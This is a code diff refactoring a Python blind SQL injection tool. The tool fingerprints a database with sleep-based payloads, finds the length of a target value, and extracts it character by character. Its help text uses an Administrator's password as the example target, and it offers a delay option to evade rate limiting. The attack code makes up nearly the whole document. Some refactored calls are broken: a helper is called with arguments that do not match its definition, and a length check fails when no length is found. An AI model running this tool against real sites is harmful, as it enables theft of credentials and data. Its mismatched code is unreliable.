@@ -129,63 +129,18 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
         if not args.sleep_only:
             print(f"[VERBOSE] Detection method: {detection}")
 
+    # Sleep-only detection
     if args.sleep_only:
-        print("[*] Sleep-only mode enabled. Skipping other detection methods...")
-        print("[*] Attempting sleep-based detection...")
-
-        for db_name, info in version_queries.items():
-            sleep_query = info.get("sleep_function", None)
-            if sleep_query:
-                for db_specific, sleep_function in sleep_query.items():
-                    payload = f"' AND {sleep_function}"
-                    encoded_payload = quote(payload)
-
-                    try: 
-                        response, response_time = injection(
-                            url=url, 
-                            encoded_payload=encoded_payload, 
-                            request_template=request_template, 
-                            injectable_headers=injectable_headers, 
-                            static_headers=static_headers, 
-                            args=args
-                            )
-                        
-                        if not response:
-                            return None, None
-
-                        if response_time > 5:
-                            print(f"[+] Sleep-based detection: Database detected as {db_name}")
-                            return db_name, info.get("substring_function", None)
-
-                    except requests.exceptions.RequestException as e:
-                        print(f"[-] Error during sleep-based detection for {db_name}: {e}")
-
-        print("[-] Unable to detect database type using sleep-based detection.")
-        return False, None
+        return sleep_based_detection(url, request_template, injectable_headers, static_headers, args)
 
     # Step 1: Baseline request
     if args.verbose:
         print(f"[VERBOSE] Sending baseline request...")
+    
     try:
-        start_time = time.time()
-        if request_template:
-            method, url, headers, body = parse_request_template(request_template)
-            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-        else:
-            headers = {**static_headers, **injectable_headers}
-            if args.data:
-                baseline_response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-            else:
-                baseline_response = requests.get(url, headers=headers, timeout=args.timeout)
-        
-        end_time = time.time()
-        baseline_status_code = baseline_response.status_code
-        baseline_content_length = len(baseline_response.text)
-        response_time = end_time - start_time
-
-        if args.verbose:
-            print(f"[VERBOSE] Baseline response status: {baseline_response.status_code}, content length: {len(baseline_response.text)}")
-            print(f"[VERBOSE] Response time: {response_time} seconds")
+        response, baseline_status_code, baseline_content_length, response_time = send_baseline_request(
+            url, request_template, injectable_headers, static_headers, args
+        )
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
         return None, None
@@ -204,17 +159,17 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
 
         try:
             response, response_time = injection(
-                url=url, 
-                encoded_payload=encoded_payload, 
-                request_template=request_template, 
-                injectable_headers=injectable_headers, 
-                static_headers=static_headers, 
+                url=url,
+                encoded_payload=encoded_payload,
+                request_template=request_template,
+                injectable_headers=injectable_headers,
+                static_headers=static_headers,
                 args=args
-                )
-            
+            )
+
             if not response:
                 return None, None
-            
+
             if args.delay > 0:
                 if args.verbose:
                     print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
@@ -240,52 +195,18 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
         except requests.exceptions.RequestException as e:
             print(f"[-] Error during database detection for {db_name}: {e}")
 
-    # Step 3: Sleep-based detection as a last resort
-    print("[*] Fallback: Attempting sleep-based detection...")
-    for db_name, info in version_queries.items():
-        sleep_query = info.get("sleep_function", None)
-        if sleep_query:
-            for db_specific, sleep_function in sleep_query.items():
-                payload = f"' AND {sleep_function}"
-                encoded_payload = quote(payload)
+    # Step 3: Sleep-based detection as a fallback
+    print("[*] Fallback: Attempting sleep based detection...")
+    return sleep_based_detection(url, request_template, injectable_headers, static_headers, args)
 
-                if args.verbose:
-                    print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
-
-                try:
-                    response, response_time = injection(
-                        url=url, 
-                        encoded_payload=encoded_payload, 
-                        request_template=request_template, 
-                        injectable_headers=injectable_headers, 
-                        static_headers=static_headers, 
-                        args=args
-                        )
-                    
-                    if not response:
-                        return None, None
-
-                    if response_time > 5:
-                        print(f"[+] Sleep-based detection: Database detected as {db_name}")
-                        return db_name, info.get("substring_function", None)
-                    
-                    if args.delay > 0:
-                        if args.verbose:
-                            print(f"[VERBOSE] Delaying requests for {args.delay} seconds...")
-                        time.sleep(args.delay)
-
-                except requests.exceptions.RequestException as e:
-                    print(f"[-] Error during sleep-based detection for {db_name}: {e}")
-
-    print("[-] Unable to detect database type.")
-    return None, None
-
-def extract_data(url, table, column, where_clause, string_function, extracted_data, position, db_name, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
+def extract_data(url, table, column, where_clause, string_function, position, db_name, data_length, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
     """
     Perform blind SQL injection to extract the data character by character.
     Use the selected extraction method to determine a successful extraction (status code, content length, sleep, or keywords).
     Fallback to sleep-based detection if all other methods fail.
     """
+
+    extracted_data = ""
 
     if args.verbose:
         print(f"[VERBOSE] Starting data extraction for {table}.{column}...")
@@ -293,59 +214,24 @@ def extract_data(url, table, column, where_clause, string_function, extracted_da
         if not args.sleep_only:
             print(f"[VERBOSE] Extraction method: {extraction}")
 
-    if args.sleep_only:
-        print("[*] Sleep-only mode enabled. Skipping other extraction methods...")
-
-        while True:
-            found_char = False
-            for char in CHARSET:
-                result = sleep_based_extraction(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, db_name, args)
-                
-                if result:
-                    extracted_data += result
-                    position += 1
-                    found_char = True
-                    break
-
-            if not found_char:
-                print(f"Data extraction complete: {extracted_data}")
-                break
-
-        return extracted_data
-
-    # Step 1: Baseline request
-    if args.verbose:
-        print(f"[VERBOSE] Sending baseline request...")
+    # Use helper function to send baseline request
     try:
-        start_time = time.time()
-        if request_template:
-            method, url, headers, body = parse_request_template(request_template)
-            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-        else:
-            headers = {**static_headers, **injectable_headers}
-            if args.data:
-                baseline_response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-            else:
-                baseline_response = requests.get(url, headers=headers, timeout=args.timeout)
-        
-        end_time = time.time()
-        baseline_status_code = baseline_response.status_code
-        baseline_content_length = len(baseline_response.text)
-        response_time = end_time - start_time
-
-        if args.verbose:
-            print(f"[VERBOSE] Baseline response status: {baseline_response.status_code}, content length: {len(baseline_response.text)}")
-            print(f"[VERBOSE] Response time: {response_time} seconds")
-
+        response, baseline_status_code, baseline_content_length, _ = send_baseline_request(
+            url, request_template, injectable_headers, static_headers, args
+        )
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
         return extracted_data
 
-    # Step 2: Iterate through possible characters
-    while True:
+    # Step 1: Iterate through possible characters until data_length is reached
+    while position <= data_length:
         found_char = False
         for char in CHARSET:
-            result = extract_character(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, args)
+            result = extract_character(
+                url, table, column, where_clause, string_function, position, char, 
+                request_template, injectable_headers, static_headers, 
+                extraction, baseline_status_code, baseline_content_length, args
+            )
 
             if result:
                 extracted_data += result
@@ -358,7 +244,10 @@ def extract_data(url, table, column, where_clause, string_function, extracted_da
         if not found_char:
             print("[*] Fallback: Attempting sleep-based extraction...")
             for char in CHARSET:
-                result = sleep_based_extraction(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, db_name, args)
+                result = sleep_based_extraction(
+                    url, table, column, where_clause, string_function, position, 
+                    char, request_template, injectable_headers, static_headers, db_name, args
+                )
                 
                 if result:
                     extracted_data += result
@@ -483,16 +372,111 @@ def injection(url, encoded_payload, request_template, injectable_headers, static
         print(f"[-] Error during request: {e}")
         return None, None
 
-def discover_data_length(url, table, column, where_clause, string_function, max_length=100, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def send_baseline_request(url, request_template, injectable_headers, static_headers, args):
     """
-    Helper function to discover the length of the data to extract.
+    Send the baseline request and return the response, status code, content length, and response time.
+    """
+    start_time = time.time()
+
+    if request_template:
+        method, url, headers, body = parse_request_template(request_template)
+        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
+    else:
+        headers = {**static_headers, **injectable_headers}
+        if args.data:
+            response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+        else:
+            response = requests.get(url, headers=headers, timeout=args.timeout)
+
+    end_time = time.time()
+    baseline_status_code = response.status_code
+    baseline_content_length = len(response.text)
+    response_time = end_time - start_time
+
+    if args.verbose:
+        print(f"[VERBOSE] Baseline response status: {baseline_status_code}, content length: {baseline_content_length}")
+        print(f"[VERBOSE] Response time: {response_time} seconds")
+
+    return response, baseline_status_code, baseline_content_length, response_time
+
+def sleep_based_detection(db_name, sleep_query, url, request_template, injectable_headers, static_headers, args):
+    """
+    Helper function to handle sleep-based detection for a given database.
+    Only attempts detection if a valid sleep function exists.
+    """
+    if not sleep_query or sleep_query == "N/A":
+        print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
+        return None, None
+
+    for db_specific, sleep_function in sleep_query.items():
+        if not sleep_function or sleep_function == "N/A":
+            print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
+            continue
+
+        payload = f"' AND {sleep_function}"
+        encoded_payload = quote(payload)
+
+        if args.verbose:
+            print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
+
+        try:
+            response, response_time = injection(
+                url=url,
+                encoded_payload=encoded_payload,
+                request_template=request_template,
+                injectable_headers=injectable_headers,
+                static_headers=static_headers,
+                args=args
+            )
+
+            if not response:
+                return None, None
+
+            if response_time > 5:
+                print(f"[+] Sleep-based detection: Database detected as {db_name}")
+                return db_name, version_queries[db_name].get("substring_function", None)
+
+            if args.delay > 0:
+                if args.verbose:
+                    print(f"[VERBOSE] Delaying requests for {args.delay} seconds...")
+                time.sleep(args.delay)
+
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Error during sleep-based detection for {db_name}: {e}")
+
+    return None, None
+
+def discover_data_length(url, table, column, where_clause, db_name, detection, max_length=100, request_template=None, injectable_headers={}, static_headers={}, args=None):
+    """
+    Helper function to discover the length of the data to extract using the appropriate length function
+    from the version_queries.json for the detected database.
     It returns the length of the data if found, or None if unsuccessful.
     """
-    if args.verbose:
-        print(f"[VERBOSE] Attempting to discover the length of the data for {table}.{column}...")
 
+    if db_name not in version_queries:
+        print(f"[-] Database {db_name} not found in version queries.")
+        return None
+
+    length_function = version_queries[db_name].get("length_function", None)
+    if not length_function or length_function == "N/A":
+        print(f"[-] Length function not found for {db_name}.")
+        return None
+
+    if args.verbose:
+        print(f"[VERBOSE] Attempting to discover the length of the data for {table}.{column} using {length_function}...")
+
+    # Step 1: Send baseline request
+    try:
+        response, baseline_status_code, baseline_content_length, _ = send_baseline_request(
+            url, request_template, injectable_headers, static_headers, args
+        )
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error during baseline request: {e}")
+        return None
+
+    # Step 2: Iterate over possible lengths
     for length in range(1, max_length + 1):
-        payload = f"' AND {string_function}(LENGTH((SELECT {column} FROM {table} WHERE {where_clause}))) = {length}"
+        payload = f"' AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {length}"
         encoded_payload = quote(payload)
 
         try:
@@ -510,24 +494,29 @@ def discover_data_length(url, table, column, where_clause, string_function, max_
 
             if args.verbose:
                 print(f"[VERBOSE] Sent request with payload to discover length: {encoded_payload}")
-                print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
+                print(f"[VERBOSE] Response status: {response.status_code}, content length: {len(response.text)}")
 
-            if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
-                print(f"[+] Data length discovered: {length}")
-                return length
-
-            if args.status_code and response.status_code == args.true_status_code:
-                print(f"[+] Data length discovered: {length}")
-                return length
+            if detection == "keyword":
+                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
+                    print(f"[+] Data length discovered: {length}")
+                    return length
+            elif detection == "status":
+                if response.status_code != baseline_status_code:
+                    print(f"[+] Data length discovered: {length} (Status code changed: {response.status_code})")
+                    return length
+            elif detection == "content":
+                if len(response.text) != baseline_content_length:
+                    print(f"[+] Data length discovered: {length} (Content length changed: {len(response.text)})")
+                    return length
 
         except requests.exceptions.RequestException as e:
             print(f"[-] Error during length discovery: {e}")
             return None
 
-    print(f"[-] Failed to discover data length within the maximum length {max_length}. Attempting data extraction without data lenth.")
+    print(f"[-] Failed to discover data length within the maximum length {max_length}. Proceeding without a determined length.")
     return None
 
-def extract_character(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, detection_method, baseline_status_code, baseline_content_length, args):
+def extract_character(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, args):
     """
     Handles character extraction using status code, content length, or keyword-based detection methods.
     """
@@ -552,15 +541,15 @@ def extract_character(url, table, column, where_clause, string_function, positio
                 print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
             time.sleep(args.delay)
 
-        if detection_method == "keyword":
+        if extraction == "keyword":
             if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                 return char
             if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                 return None
-        elif detection_method == "status":
+        elif extraction == "status":
             if response.status_code != baseline_status_code:
                 return char
-        elif detection_method == "content":
+        elif extraction == "content":
             response_content_length = len(response.text)
             if response_content_length != baseline_content_length:
                 return char
@@ -618,6 +607,7 @@ def main():
     parser.add_argument('-t', '--table', required=False, help="Table name from which to extract the data")
     parser.add_argument('-c', '--column', required=False, help="Column name to extract (e.g., Password)")
     parser.add_argument('-w', '--where', required=False, help="WHERE clause (e.g., Username = 'Administrator')")
+    parser.add_argument('-m', '--max-length', type=int, default=100, help="Maximum length of the extracted data that the script will check for (default: 100)")
     parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
     parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
     parser.add_argument('--true-keywords', nargs='+', help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
@@ -673,14 +663,15 @@ def main():
 
     # Step 3: Extract the data
     extracted_data = ""
-    position = 1
 
     data_length = discover_data_length(
         url=args.url,
         table=args.table,
         column=args.column,
         where_clause=args.where,
-        string_function=string_function,
+        db_name=db_type,
+        detection=detection,
+        max_length=args.max_length,
         request_template=request_template,
         injectable_headers=injectable_headers,
         static_headers=static_headers,
@@ -690,27 +681,24 @@ def main():
     if data_length:
         print(f"[+] Data length to extract: {data_length}")
     else:
-        continue
+        print("[-] Unable to determine data length. Proceeding with extraction anyway.")
 
-    if args.table and args.column and args.where:
-        extracted_data = extract_data(
-            args.url, 
-            injectable_headers,
-            args.table, 
-            args.column, 
-            args.where, 
-            string_function, 
-            extracted_data, 
-            position, 
-            db_type,
-            request_template,
-            static_headers,
-            extraction=detection,
-            args=args
-        )
-        print(f"Extracted data: {extracted_data}")
-    else:
-        print("[-] Missing required table, column, or where clause arguments for data extraction.")
+    extracted_data = extract_data(
+        url=args.url, 
+        table=args.table, 
+        column=args.column, 
+        where_clause=args.where, 
+        string_function=string_function, 
+        position=1,  # Start from position 1
+        db_name=db_type,
+        data_length=data_length,  # Pass the data_length here
+        request_template=request_template,
+        injectable_headers=injectable_headers,
+        static_headers=static_headers,
+        extraction=detection,  # Pass detection method here
+        args=args
+    )
+    print(f"Extracted data: {extracted_data}")
 
 if __name__ == "__main__":
     main()
